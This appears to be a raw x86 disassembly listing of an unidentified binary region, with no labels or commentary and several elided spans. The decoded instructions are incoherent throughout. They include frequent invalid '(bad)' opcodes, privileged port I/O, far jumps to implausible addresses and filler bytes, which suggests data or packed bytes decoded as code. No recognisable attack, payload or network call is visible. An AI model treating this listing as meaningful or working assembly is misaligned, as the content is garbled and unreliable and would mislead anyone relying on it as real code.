  415e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e42:	xchg   DWORD PTR [eax-0x4d21d67f],ebx
  415e48:	cmp    BYTE PTR [edi+0x215b821c],ah
  415e4e:	clc    
  415e4f:	daa    
  415e50:	mov    ah,0x7
  415e52:	inc    ecx
  415e53:	sbb    esp,edi
  415e55:	and    eax,0xfbe31b12
  415e5a:	shl    DWORD PTR [edx+0x57ea7b36],0x19
  415e61:	es popa 
  415e63:	mul    BYTE PTR [ecx-0x4750be35]
  415e69:	jne    0x415e6f
  415e6b:	mov    edi,0xcee6
	...
  415ed4:	add    BYTE PTR [eax],al
  415ed6:	out    dx,al
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax+0x3a]
  415ee3:	retf   0x8ad7
  415ee6:	addr16 in al,dx
  415ee8:	add    BYTE PTR [eax],al
  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	mov    dl,0x9c
  415ef0:	push   ebx
  415ef1:	dec    edi
  415ef2:	mov    ch,0x64
  415ef4:	push   DWORD PTR [ebx+eiz*1+0x406b96be]
  415efb:	outs   dx,BYTE PTR ds:[esi]
  415efc:	push   ecx
  415efd:	ret    
  415efe:	cmc    
  415eff:	test   al,0x97
  415f01:	stc    
  415f02:	adc    BYTE PTR [esi+0x477fef5c],cl
  415f08:	loopne 0x415e9d
  415f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f0b:	and    al,0x99
  415f0d:	les    eax,FWORD PTR [eax+0x681475e2]
  415f13:	nop
  415f14:	clc    
  415f15:	jg     0x415ee5
  415f17:	mov    edi,0xda25b145
  415f1c:	neg    BYTE PTR [edi-0x8]
  415f1f:	jge    0x415f4f
  415f21:	cs adc bl,0x1d
  415f25:	adc    BYTE PTR [edi-0xb],ah
  415f28:	push   edi
  415f29:	xor    BYTE PTR [ebx],dl
  415f2b:	shl    BYTE PTR [edi+0x31a1a324],0x23
  415f32:	lods   eax,DWORD PTR ds:[esi]
  415f33:	pop    ebx
  415f34:	stos   DWORD PTR es:[edi],eax
  415f35:	std    
  415f36:	sbb    al,0x8b
  415f38:	int3   
  415f39:	jg     0x415eed
  415f3b:	dec    eax
  415f3c:	or     eax,0x8f38fc7a
  415f41:	nop
  415f42:	fstp   st(7)
  415f44:	pop    ds
  415f45:	pop    edx
  415f46:	jo     0x415f55
  415f48:	dec    esp
  415f49:	imul   esp,DWORD PTR [edx+0x6c],0x64
  415f4d:	jle    0x415ede
  415f4f:	mov    cl,0xd6
  415f51:	jge    0x415eec
  415f53:	inc    eax
  415f54:	test   edx,0x6df29d01
  415f5a:	icebp  
  415f5b:	sub    bh,BYTE PTR [ecx-0x28]
  415f5e:	push   ebx
  415f5f:	into   
  415f60:	leave  
  415f61:	jb     0x415f10
  415f63:	push   edx
  415f64:	mov    fs,WORD PTR [ebx]
  415f66:	cdq    
  415f67:	cli    
  415f68:	and    al,0x41
  415f6a:	jne    0x415f21
  415f6c:	out    dx,al
  415f6d:	xlat   BYTE PTR cs:[ebx]
  415f6f:	mov    esi,0x9b2c406e
  415f74:	retf   
  415f75:	sub    eax,0x16055fd2
  415f7a:	mov    eax,ds:0xdbb79ee2
  415f7f:	dec    edx
  415f80:	(bad)
  415f84:	mov    eax,ds:0xbc702dd3
  415f89:	ins    DWORD PTR es:[edi],dx
  415f8a:	and    dh,BYTE PTR [edi]
  415f8c:	bound  edi,QWORD PTR [ebp+0x14]
  415f8f:	pushf  
  415f90:	sub    al,0xf
  415f92:	pop    ebp
  415f93:	mov    esp,0x3a418583
  415f98:	mov    al,ds:0xc58833e0
  415f9d:	inc    esp
  415f9e:	shr    BYTE PTR [ebx-0x918cac6],cl
  415fa4:	push   esp
  415fa5:	xchg   BYTE PTR [edx-0x14],bl
  415fa8:	mov    bh,0x44
  415faa:	lea    ebx,[edx+0x621ab82c]
  415fb0:	pop    dx
  415fb2:	add    bl,ch
  415fb4:	mov    ah,0x94
  415fb6:	mov    DWORD PTR fs:[ebp-0xcfe58d2],edx
  415fbd:	push   ds
  415fbe:	cmp    DWORD PTR [ebp-0x3a83c37c],ecx
  415fc4:	jo     0x41603a
  415fc6:	or     DWORD PTR [esi+edx*1+0x5323af7a],edx
  415fcd:	rcl    DWORD PTR [esi+0x5477fa48],0x1c
  415fd4:	inc    DWORD PTR [ebx-0x7f927cec]
  415fda:	fwait
  415fdb:	push   ds
  415fdc:	shl    BYTE PTR [ecx],0x1a
  415fdf:	lahf   
  415fe0:	test   BYTE PTR [ebx+eiz*2],0xc
  415fe4:	aaa    
  415fe5:	push   ss
  415fe6:	xor    eax,0x5cbdd4c0
  415feb:	dec    ebp
  415fec:	mov    ch,0x87
	...
  416056:	pop    ss
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	jle    0x415ff9
  416064:	pop    ds
  416065:	test   DWORD PTR [edi-0x13],esp
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	pop    edx
  41606f:	imul   esp,DWORD PTR [edi],0xffffffca
  416072:	fsubr  st,st(6)
  416074:	or     al,0x2d
  416076:	in     al,dx
  416077:	jmp    0x4160c7
  416079:	push   ecx
  41607a:	or     edi,ebp
  41607c:	call   0x147beb1
  416081:	adc    bl,dl
  416083:	pop    edx
  416084:	test   eax,0xf370949e
  416089:	(bad)  
  41608a:	jmp    0x4160fc
  41608c:	adc    eax,0xc6e64b6f
  416091:	enter  0x2a31,0x49
  416095:	xchg   esi,eax
  416096:	aaa    
  416097:	mov    ds:0x391353ac,eax
  41609c:	pop    ebp
  41609d:	sar    BYTE PTR [edx],cl
  41609f:	sbb    al,0xb5
  4160a1:	and    al,0x84
  4160a3:	outs   dx,BYTE PTR ds:[esi]
  4160a4:	mov    bh,BYTE PTR [ebp+0x22]
  4160a7:	inc    edx
  4160a8:	mov    eax,0xe0571ef4
  4160ad:	stos   DWORD PTR es:[edi],eax
  4160ae:	leave  
  4160af:	dec    esp
  4160b0:	or     al,BYTE PTR [ebp-0x172569c]
  4160b6:	out    dx,eax
  4160b7:	cmp    dl,BYTE PTR [ebx-0xff53b1e]
  4160bd:	pop    ebx
  4160be:	in     eax,dx
  4160bf:	jmp    0x9676d4e5
  4160c4:	mov    eax,0x1f15e8eb
  4160c9:	lods   eax,DWORD PTR ds:[esi]
  4160ca:	adc    bh,BYTE PTR [ebp+0x3e471396]
  4160d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160d1:	repnz sbb dl,BYTE PTR [eax-0x7c29b6a0]
  4160d8:	mov    bh,BYTE PTR [edx+0x39]
  4160db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160dc:	dec    edi
  4160dd:	scas   eax,DWORD PTR es:[edi]
  4160de:	push   esp
  4160df:	out    dx,al
  4160e0:	ret    0x7876
  4160e3:	sub    eax,0x36467cca
  4160e8:	and    BYTE PTR [esi+0x3e],cl
  4160eb:	xor    al,0x78
  4160ed:	or     ecx,DWORD PTR [edx+0x58]
  4160f0:	add    cl,BYTE PTR [esi]
  4160f2:	xor    BYTE PTR [eax],al
  4160f4:	fnstcw WORD PTR [bx+si-0x424a]
  4160f9:	ftst   
  4160fb:	add    eax,0xad3b57d
  416100:	xor    DWORD PTR [ebx-0x72405700],edx
  416106:	loopne 0x41610d
  416108:	or     BYTE PTR [ecx],ch
  41610a:	inc    esp
  41610b:	ss push ebp
  41610d:	push   esp
  41610e:	push   es
  41610f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416110:	or     DWORD PTR [ebx],ebx
  416112:	xchg   ebp,eax
  416113:	aas    
  416114:	add    al,0xa9
  416116:	cmc    
  416117:	cmp    edx,DWORD PTR [si+0x6a28]
  41611c:	in     eax,dx
  41611d:	mov    dl,0xcd
  41611f:	aam    0xd6
  416121:	push   ecx
  416122:	mov    bh,0x52
  416124:	or     BYTE PTR [ebp+0x1140262d],ch
  41612a:	mov    DWORD PTR [esi-0x2a],eax
  41612d:	or     al,0x27
  41612f:	pusha  
  416130:	mov    ebp,ss
  416132:	jb     0x4160cb
  416134:	mov    eax,0x2acefd18
  416139:	jns    0x416173
  41613b:	call   0x137db112
  416140:	xlat   BYTE PTR ds:[ebx]
  416141:	xchg   ebp,eax
  416142:	(bad)  
  416143:	fstp   QWORD PTR [edx-0x76]
  416146:	sub    ecx,eax
  416148:	into   
  416149:	sub    BYTE PTR [ecx-0xe],dh
  41614c:	cmp    cl,BYTE PTR [ebx-0x1e]
  41614f:	out    dx,al
  416150:	push   ecx
  416151:	mov    BYTE PTR [ecx+0x39],dh
  416154:	jne    0x416139
  416156:	push   esp
  416157:	mov    bl,0x11
  416159:	sahf   
  41615a:	std    
  41615b:	dec    esp
  41615c:	fist   WORD PTR [esi]
  41615e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41615f:	inc    edi
  416160:	jge    0x416114
  416162:	out    dx,eax
  416163:	sar    DWORD PTR [ebp-0x2a],cl
  416166:	lds    edx,FWORD PTR [ecx+0xe]
  416169:	cmp    cl,BYTE PTR [esi+edi*4+0x48]
  41616d:	rol    DWORD PTR [eax],cl
	...
  4161d3:	add    BYTE PTR [eax],al
  4161d5:	add    BYTE PTR [eax],ah
  4161d7:	jmp    0xdf3d4017
  4161dc:	in     eax,0xff
  4161de:	(bad)  
  4161df:	push   edx
  4161e0:	sub    eax,0xeac773f3
  4161e5:	test   eax,0xee67
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	imul   dh
  4161f0:	mov    DWORD PTR [esi-0x2d],ebx
  4161f3:	mov    edx,0xe07086cc
  4161f8:	fdivr  st(0),st
  4161fa:	mov    dh,0xf5
  4161fc:	inc    esi
  4161fd:	jno    0x41618a
  4161ff:	or     BYTE PTR [ebx-0x597ae80],0x6d
  416206:	loope  0x4161d6
  416208:	aaa    
  416209:	xchg   esp,eax
  41620a:	inc    esi
  41620b:	xor    al,0x47
  41620d:	outs   dx,DWORD PTR ds:[esi]
  41620e:	push   edi
  41620f:	adc    eax,0x7546e254
  416214:	dec    esi
  416215:	and    eax,0x197d861
  41621a:	aad    0x3
  41621c:	xor    DWORD PTR [esi-0x49d6f0d8],eax
  416222:	ss sbb al,0x6a
  416225:	int3   
  416226:	cmp    DWORD PTR [edi+esi*4],ebx
  416229:	jge    0x4161d9
  41622b:	jmp    0x416277
  41622d:	dec    ebx
  41622e:	in     al,0x1d
  416230:	adc    ecx,DWORD PTR [esi-0x3ffb1f99]
  416236:	scas   eax,DWORD PTR es:[edi]
  416237:	cmp    eax,0x30b0e174
  41623c:	pop    ds
  41623d:	xchg   edx,eax
  41623e:	pop    ebp
  41623f:	gs dec ebx
  416241:	fwait
  416242:	push   0xffffffc8
  416244:	mov    ecx,DWORD PTR [ecx]
  416246:	bound  edi,QWORD PTR [eax]
  416248:	pop    esp
  416249:	and    DWORD PTR [eax+ecx*4],edi
  41624c:	jle    0x416230
  41624e:	inc    ebx
  41624f:	mov    bh,0x29
  416251:	and    BYTE PTR [eax],dl
  416253:	push   0x78
  416255:	pop    ecx
  416256:	adc    al,BYTE PTR [esp+ebp*4+0x559fdcd7]
  41625d:	imul   DWORD PTR [ebx-0x2d16504d]
  416263:	push   ecx
  416264:	mov    ds:0xdb1471d5,eax
  416269:	mov    ch,0x25
  41626b:	in     eax,dx
  41626c:	sbb    DWORD PTR [esi+0x50b27fca],eax
  416272:	xor    BYTE PTR [ecx+0x6ea7e1f3],dh
  416278:	mov    edi,0xb94242b4
  41627d:	add    eax,0x9b42679d
  416282:	xchg   esp,eax
  416283:	fsub   QWORD PTR [ecx+0xb]
  416286:	cwde   
  416287:	aaa    
  416288:	push   ebp
  416289:	mov    eax,0xa71b6425
  41628e:	mov    DWORD PTR [ebp+ebp*4+0x78],edx
  416292:	dec    esi
  416293:	sahf   
  416294:	(bad)  
  416295:	shl    BYTE PTR [ebx-0x64],1
  416298:	sbb    DWORD PTR [esi+0x4259cf51],0x81af28d7
  4162a2:	inc    esi
  4162a3:	adc    cl,BYTE PTR [esi]
  4162a5:	nop
  4162a6:	dec    ebx
  4162a7:	jmp    0x41628b
  4162a9:	cmc    
  4162aa:	xchg   esp,eax
  4162ab:	jo     0x416236
  4162ad:	jb     0x4162e1
  4162af:	xor    al,0xdd
  4162b1:	jmp    0x41626b
  4162b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162b4:	xor    bl,bh
  4162b6:	mov    ebp,0x3ecc42ad
  4162bb:	push   edx
  4162bc:	push   eax
  4162bd:	sub    DWORD PTR [ecx],esp
  4162bf:	jo     0x41633b
  4162c1:	ins    BYTE PTR es:[edi],dx
  4162c2:	fsubr  QWORD PTR [bx+di]
  4162c5:	fsubp  st(7),st
  4162c7:	lahf   
  4162c8:	fmul   QWORD PTR [edi]
  4162ca:	out    dx,eax
  4162cb:	mov    ds:0x858c316f,eax
  4162d0:	aad    0x34
  4162d2:	das    
  4162d3:	inc    ebx
  4162d4:	mov    bh,ch
  4162d6:	push   ss
  4162d7:	or     al,0x2c
  4162d9:	pop    edi
  4162da:	pop    ebx
  4162db:	dec    ebp
  4162dc:	fs in  eax,0x1f
  4162df:	je     0x416307
  4162e1:	std    
  4162e2:	mov    ah,0x2d
  4162e4:	add    dh,dh
  4162e6:	dec    edi
  4162e7:	xchg   esi,eax
  4162e8:	aam    0x8
  4162ea:	add    eax,0xcd6323
	...
  416353:	add    BYTE PTR [eax],al
  416355:	add    BYTE PTR [ebx],ah
  416357:	outs   dx,BYTE PTR ds:[esi]
  416358:	xor    ah,BYTE PTR ds:0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x6704:0xbd0fa3ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	lods   eax,DWORD PTR ds:[esi]
  41636f:	mov    BYTE PTR [edi-0x5c],ch
  416372:	jmp    0xee4e:0xf00960d2
  416379:	fcomp  QWORD PTR [eax]
  41637b:	push   ds
  41637c:	mov    ch,0xcf
  41637e:	test   BYTE PTR [edx],0xc
  416381:	lds    esp,FWORD PTR [eax]
  416383:	xor    ch,dh
  416385:	jnp    0x416312
  416387:	fdiv   QWORD PTR [edi-0x25]
  41638a:	pop    es
  41638b:	sbb    BYTE PTR [edi-0x302fb2a5],dh
  416391:	dec    edi
  416392:	rol    BYTE PTR [esi],0x33
  416395:	and    ah,ah
  416397:	sti    
  416398:	sbb    BYTE PTR [edi-0x56],ah
  41639b:	push   esp
  41639c:	aas    
  41639d:	ins    BYTE PTR es:[edi],dx
  41639e:	into   
  41639f:	ja     0x416384
  4163a1:	ret    0x2f08
  4163a4:	test   eax,0xc2bd72fd
  4163a9:	aas    
  4163aa:	sub    BYTE PTR [ecx+0x36272ed],bl
  4163b0:	sahf   
  4163b1:	sub    ebx,DWORD PTR [esi+ecx*4-0x69]
  4163b5:	fsub   st,st(4)
  4163b7:	xor    esp,DWORD PTR [ebp+0x13]
  4163ba:	jg     0x416348
  4163bc:	sub    al,0x61
  4163be:	aas    
  4163bf:	aas    
  4163c0:	fwait
  4163c1:	int    0x3f
  4163c3:	fcomi  st,st(3)
  4163c5:	ja     0x41638e
  4163c7:	adc    eax,0x7e4a634e
  4163cc:	nop
  4163cd:	add    eax,0xdf8ca658
  4163d2:	mov    dl,0x20
  4163d4:	sub    DWORD PTR [ebx-0xf],0x6693637
  4163db:	(bad)  
  4163dc:	out    0x73,eax
  4163de:	std    
  4163df:	loop   0x416446
  4163e1:	xchg   ebx,edi
  4163e3:	push   edi
  4163e4:	stos   BYTE PTR es:[edi],al
  4163e5:	je     0x416423
  4163e7:	jmp    0x416460
  4163e9:	aaa    
  4163ea:	sbb    eax,0xecc548ec
  4163ef:	ret    
  4163f0:	jnp    0x4163b1
  4163f2:	es jbe 0x4163e3
  4163f5:	das    
  4163f6:	hlt    
  4163f7:	rcr    DWORD PTR [ecx-0x23a95174],cl
  4163fd:	xor    eax,0x3ebaf12e
  416402:	add    esp,0xfffffffd
  416405:	pop    esp
  416406:	pop    edi
  416407:	fidiv  DWORD PTR [edi-0x5a5dfcfc]
  41640d:	dec    ebp
  41640e:	push   ds
  41640f:	add    esi,DWORD PTR [eax+0x427e0d5e]
  416415:	aam    0xd1
  416417:	fimul  WORD PTR [ebx-0x23]
  41641a:	push   esp
  41641b:	inc    ebx
  41641c:	(bad)  [ebp+0x2cc44ffa]
  416422:	sar    BYTE PTR [ecx-0x7d],0xbc
  416426:	stos   DWORD PTR es:[edi],eax
  416427:	hlt    
  416428:	ret    0x1812
  41642b:	add    eax,0x167b7239
  416430:	xor    al,BYTE PTR [ebx-0x4b]
  416433:	inc    ebp
  416434:	inc    eax
  416435:	xor    BYTE PTR [esi],bl
  416437:	xor    esp,DWORD PTR [eax]
  416439:	xor    al,0x55
  41643b:	popf   
  41643c:	or     al,0xdc
  41643e:	test   DWORD PTR [ebx+edi*1],ebp
  416441:	hlt    
  416442:	adc    dl,0xf9
  416445:	pop    esp
  416446:	dec    ebp
  416447:	sbb    eax,0xb82c8b8d
  41644c:	mov    al,ds:0xbf01ee26
  416451:	pop    ss
  416452:	pop    ds
  416453:	leave  
  416454:	sub    eax,0xf048f655
  416459:	in     al,0x3b
  41645b:	hlt    
  41645c:	repz add al,0xdd
  41645f:	imul   eax,DWORD PTR [ebp+0x7],0x7e
  416463:	push   es
  416464:	sbb    eax,0x5b12bb1b
  416469:	mov    ebx,0xb3167977
	...
  4164d6:	repz inc ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	mov    eax,ds:0x67dffd3b
  4164e7:	lock add BYTE PTR [eax],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	mov    eax,0xe8371249
  4164f3:	fwait
  4164f4:	add    DWORD PTR ds:0xa698a36e,0x1
  4164fb:	pop    edx
  4164fc:	clc    
  4164fd:	inc    esi
  4164fe:	jl     0x4164db
  416500:	stc    
  416501:	pop    ss
  416502:	push   ecx
  416503:	cmc    
  416504:	sub    al,0xfd
  416506:	pop    edi
  416507:	push   ebp
  416508:	lods   eax,DWORD PTR ds:[esi]
  416509:	aas    
  41650a:	mov    al,ds:0x286404db
  41650f:	std    
  416510:	movd   mm1,DWORD PTR [edi*8+0x69b01b43]
  416518:	pop    esi
  416519:	das    
  41651a:	mov    esp,0xf8d87e26
  41651f:	fadd   QWORD PTR [edi+eiz*2+0x663256d5]
  416526:	inc    edi
  416527:	pusha  
  416528:	(bad)  
  416529:	pop    ss
  41652a:	sbb    al,0x0
  41652c:	inc    edx
  41652d:	pop    ss
  41652e:	call   DWORD PTR [edx+0x48]
  416531:	popa   
  416532:	mov    esp,0x69eec32
  416537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416538:	or     DWORD PTR [ebp+0x24],ecx
  41653b:	inc    ebx
  41653c:	mov    ch,0x8b
  41653e:	sub    DWORD PTR [edx],0x78
  416541:	push   esp
  416542:	popf   
  416543:	mov    ebx,DWORD PTR [ecx-0x51305b3c]
  416549:	push   es
  41654a:	mov    esp,0x3ca06025
  41654f:	rol    DWORD PTR [ebp+esi*4-0x77d60561],1
  416556:	inc    edi
  416557:	jnp    0x416574
  416559:	lds    ebp,FWORD PTR [ebx+0x51]
  41655c:	push   ebx
  41655d:	lds    esi,FWORD PTR [eax+0x167d73e5]
  416563:	mov    ebx,0xa8bb96e1
  416568:	adc    ch,BYTE PTR [ebx-0x46]
  41656b:	sub    eax,0x6d624bbf
  416570:	xor    BYTE PTR [ebp-0x69ac9b39],0xb1
  416577:	push   ebp
  416578:	cmc    
  416579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657a:	xchg   edx,eax
  41657b:	mov    BYTE PTR [ebp+ebp*2-0x2b465839],bh
  416582:	mov    ds:0x532b75dc,eax
  416587:	data16 mov cl,0x88
  41658a:	sbb    DWORD PTR [eax],edi
  41658c:	xchg   edi,eax
  41658d:	mov    esi,esp
  41658f:	sub    al,0xad
  416591:	les    ecx,FWORD PTR [edi]
  416593:	adc    edx,DWORD PTR [eax-0x54]
  416596:	jbe    0x41655d
  416598:	std    
  416599:	rcr    ah,0x44
  41659c:	mov    bh,0xbc
  41659e:	adc    ebx,DWORD PTR [ebx]
  4165a0:	mov    dh,0x84
  4165a2:	fsubr  QWORD PTR [edx+0xf468f65]
  4165a8:	mov    gs,ebp
  4165aa:	pop    ecx
  4165ab:	push   cs
  4165ac:	push   0x6d
  4165ae:	xor    BYTE PTR [eax+0x71f767a0],ah
  4165b4:	sub    ecx,esi
  4165b6:	test   BYTE PTR [ebp+0x19f61e85],cl
  4165bc:	sbb    dh,BYTE PTR [edi+0x2f]
  4165bf:	jae    0x4165e2
  4165c1:	stos   DWORD PTR es:[edi],eax
  4165c2:	mov    ds:0xa29e255b,eax
  4165c7:	or     BYTE PTR [edx],dh
  4165c9:	outs   dx,DWORD PTR ds:[esi]
  4165ca:	mov    ebx,0x16b80e0e
  4165cf:	sbb    BYTE PTR [esi+eiz*8+0x23],dh
  4165d3:	rcr    esi,1
  4165d5:	mov    dh,0xd6
  4165d7:	push   edx
  4165d8:	jb     0x416621
  4165da:	ficomp WORD PTR [edi-0x5b69d45e]
  4165e0:	xchg   BYTE PTR [ecx+esi*4-0xa],dl
  4165e4:	pop    edx
  4165e5:	pusha  
  4165e6:	push   ecx
  4165e7:	pop    esi
  4165e8:	pop    esi
  4165e9:	hlt    
  4165ea:	pop    ebx
  4165eb:	or     BYTE PTR [ecx+edx*8+0x0],ah
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi+0x4c4fbcac]
  416663:	iret   
  416664:	das    
  416665:	cwde   
  416666:	addr16 icebp 
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	cmp    bh,BYTE PTR [ecx-0x35]
  416671:	mov    ah,0x47
  416673:	add    dh,ah
  416675:	jb     0x416605
  416677:	add    eax,0x58c7208f
  41667c:	mov    eax,0xf4511c9c
  416681:	sbb    DWORD PTR [eax],edx
  416683:	push   esi
  416684:	std    
  416685:	pop    ebp
  416686:	mov    eax,0x65366a49
  41668b:	inc    esp
  41668c:	jmp    FWORD PTR ds:0xc6f2da7f
  416692:	sbb    al,0xad
  416694:	imul   edi,esp,0x8f186661
  41669a:	jg     0x4166a6
  41669c:	test   al,0xa
  41669e:	fwait
  41669f:	xor    DWORD PTR ds:0xaf4e1bc,0x6316585f
  4166a9:	sub    BYTE PTR [esi-0x1f],cl
  4166ac:	or     DWORD PTR [eax],eax
  4166ae:	or     ebp,DWORD PTR ds:0xd6e7ed0e
  4166b4:	push   0x70ad7bbf
  4166b9:	stos   BYTE PTR es:[edi],al
  4166ba:	(bad)  
  4166bb:	(bad)  
  4166bc:	push   esi
  4166bd:	sbb    al,0x4a
  4166bf:	loop   0x41664b
  4166c1:	(bad)  
  4166c2:	sahf   
  4166c3:	stos   DWORD PTR es:[edi],eax
  4166c4:	pop    edx
  4166c5:	loop   0x41670d
  4166c7:	mov    esi,0x82981889
  4166cc:	mov    BYTE PTR [ecx-0xb],cl
  4166cf:	push   ecx
  4166d0:	nop
  4166d1:	or     bh,dl
  4166d3:	cmp    al,0xa
  4166d5:	and    ebp,DWORD PTR [ecx]
  4166d7:	xchg   esi,eax
  4166d8:	jmp    0xfb7867da
  4166dd:	inc    ebp
  4166de:	and    ebx,esp
  4166e0:	aaa    
  4166e1:	mov    ebx,cs
  4166e3:	aas    
  4166e4:	imul   esi,DWORD PTR [edi+0xfd35b21],0xfffffffe
  4166eb:	loop   0x416691
  4166ed:	jge    0x41672e
  4166ef:	sub    bl,BYTE PTR [ebx+0x1a]
  4166f2:	and    BYTE PTR [ebx-0x6cfeef1d],bl
  4166f8:	dec    ebx
  4166f9:	xchg   DWORD PTR [eax+0x106d9b2d],ebp
  4166ff:	(bad)  
  416700:	mul    esp
  416702:	xor    ecx,esi
  416704:	in     eax,0x8c
  416706:	test   eax,eax
  416708:	xlat   BYTE PTR ds:[ebx]
  416709:	sbb    edx,DWORD PTR [esi+ebx*4]
  41670c:	lahf   
  41670d:	xor    eax,0xdedc81bb
  416712:	(bad)  
  416713:	in     al,dx
  416714:	sub    eax,0xbcb7e436
  416719:	or     al,dh
  41671b:	sti    
  41671c:	jl     0x416775
  41671e:	mov    bh,0x59
  416720:	or     WORD PTR [edx],0xffda
  416724:	scas   eax,DWORD PTR es:[edi]
  416725:	sbb    bh,BYTE PTR [esi+esi*4-0x9]
  416729:	mov    DWORD PTR [esi+0x5f3196a8],ebp
  41672f:	popa   
  416730:	push   ebp
  416731:	inc    edx
  416732:	push   eax
  416733:	inc    ebx
  416734:	push   edx
  416735:	sub    BYTE PTR [ebp+0x4],dh
  416738:	sahf   
  416739:	xor    esi,DWORD PTR [edx]
  41673b:	xor    BYTE PTR [edx+0x6f993044],0x6b
  416742:	dec    ebx
  416743:	pop    eax
  416744:	fsqrt  
  416746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416747:	or     eax,0xb821c8b0
  41674c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41674d:	and    edx,DWORD PTR [ebx+0x4]
  416750:	fst    DWORD PTR cs:[ebx]
  416753:	aas    
  416754:	mov    esi,0x3384a655
  416759:	push   es
  41675a:	and    esp,DWORD PTR [esi]
  41675c:	xor    BYTE PTR [ebx+0x1724ed46],dh
  416762:	sbb    esp,eax
  416764:	pop    ecx
  416765:	fisubr DWORD PTR [esi-0x25]
  416768:	iret   
  416769:	(bad)  
  41676a:	sub    edx,esi
  41676c:	dec    ebx
  41676d:	pop    edx
	...
  4167d6:	(bad)  
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	cmp    BYTE PTR ds:0xf267cdb1,0x0
  4167e9:	add    BYTE PTR [eax],al
  4167eb:	add    DWORD PTR [eax],eax
  4167ed:	add    BYTE PTR [edx+0x69140b91],al
  4167f3:	cmp    BYTE PTR [eax],dl
  4167f5:	stos   BYTE PTR es:[edi],al
  4167f6:	out    0x98,al
  4167f8:	fs cmp al,0x93
  4167fb:	lds    esi,FWORD PTR [ebx]
  4167fd:	sbb    ah,dl
  4167ff:	xlat   BYTE PTR ds:[ebx]
  416800:	fwait
  416801:	mov    edi,0x2e085b31
  416806:	addr16 clc 
  416808:	or     ebp,DWORD PTR [ebx]
  41680a:	adc    DWORD PTR [edx+edx*4+0x4356c0d9],ecx
  416811:	mov    ebx,0xb6d94367
  416816:	inc    ecx
  416817:	cwde   
  416818:	(bad)  
  416819:	or     al,0x14
  41681b:	push   0xca10c303
  416820:	dec    edx
  416821:	fild   QWORD PTR [eax-0x50]
  416824:	dec    eax
  416825:	icebp  
  416826:	mov    WORD PTR [edi+0x2e],fs
  416829:	daa    
  41682a:	(bad)  
  41682b:	div    BYTE PTR [ecx+ebp*8+0x39]
  41682f:	in     eax,dx
  416830:	inc    edx
  416831:	(bad)  
  416832:	ins    BYTE PTR es:[edi],dx
  416833:	in     al,dx
  416834:	dec    edi
  416835:	add    edx,DWORD PTR ds:0xe267a633
  41683b:	fldcw  WORD PTR [eax-0x228e19f1]
  416841:	in     al,0x18
  416843:	dec    esi
  416844:	lods   al,BYTE PTR ds:[esi]
  416845:	pop    ecx
  416846:	xchg   ecx,eax
  416847:	adc    esi,esp
  416849:	pop    ecx
  41684a:	and    BYTE PTR [edi-0x6473f6c8],bh
  416850:	lods   al,BYTE PTR ds:[esi]
  416851:	pop    ebp
  416852:	stos   BYTE PTR es:[edi],al
  416853:	inc    esp
  416854:	stos   DWORD PTR es:[edi],eax
  416855:	mov    dh,bh
  416857:	xchg   esp,eax
  416858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416859:	fimul  DWORD PTR [edi]
  41685b:	arpl   WORD PTR [ecx-0x2fcaa58d],ax
  416861:	stos   DWORD PTR es:[edi],eax
  416862:	(bad)  
  416863:	cli    
  416864:	and    bl,BYTE PTR [edi+eiz*2]
  416867:	out    dx,al
  416868:	addr16 xchg ecx,eax
  41686a:	popa   
  41686b:	daa    
  41686c:	bound  ecx,QWORD PTR [edi+0x698b60f0]
  416872:	cld    
  416873:	sti    
  416874:	mov    WORD PTR [edx+0x34],gs
  416877:	fistp  WORD PTR [eax-0x5e]
  41687a:	es (bad) 
  41687d:	push   ebp
  41687e:	enter  0xe17b,0x7c
  416882:	shr    ebx,1
  416884:	push   ebp
  416885:	adc    eax,0x6430b7
  41688a:	and    eax,0xaff04ea9
  41688f:	or     eax,0x7e95633d
  416894:	add    eax,0x914769f4
  416899:	adc    edx,ebx
  41689b:	adc    DWORD PTR [edi+0x55],ebx
  41689e:	fs or  al,0x9e
  4168a1:	adc    bl,BYTE PTR [esp+ecx*1]
  4168a4:	jmp    0x4168f6
  4168a6:	ds in  al,0x9e
  4168a9:	in     eax,dx
  4168aa:	push   ds
  4168ab:	xchg   ecx,eax
  4168ac:	stos   BYTE PTR es:[edi],al
  4168ad:	pop    eax
  4168ae:	and    eax,0x98cf0a71
